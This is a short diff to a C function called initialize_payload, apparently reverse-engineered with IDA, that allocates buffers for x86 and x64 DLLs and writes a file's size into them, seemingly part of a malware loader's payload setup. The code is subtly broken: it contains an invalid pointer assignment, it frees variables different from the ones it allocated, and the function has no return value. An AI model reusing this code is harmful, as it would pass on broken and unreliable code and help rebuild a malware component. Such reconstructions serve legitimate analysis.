@@ -41,20 +41,20 @@ HGLOBAL initialize_payload()
 	DWORD NumberOfBytesRead;
 	DWORD fileSize;
 	//size = 0x4060 converted to decimal: 16480
-	//GlobalAlloc(GPTR, 5298176)
+	//Possibly -> GlobalAlloc(GPTR, 5298176)
 	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
 	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
 	
 	//size = 0xc8a4 converted to decimal: 51364
-	//GlobalAlloc(GPTR, 5298176)
+	//Possibly -> GlobalAlloc(GPTR, 5298176)
 	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
 	
-	//if no errors continue, otherwise close and abort()
+	//if no errors continue
 	if(hDLL_x86 || hDLL_x64)
 	{
 		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
 		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
-		if(fileHandle != INVALID_FILE_HANDLE)
+		if(fileHandle != INVALID_HANDLE_VALUE)
 		{
 			fileSize = GetFileSize(fileHandle, NULL);
 			*(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
@@ -66,10 +66,8 @@ HGLOBAL initialize_payload()
 	}
 	else
 	{
-		//if problem
 		GlobalFree(hMemory_x86);
 		GlobalFree(hMemory_x64);
-		abort(); // or return NULL;
 	}
 }
 
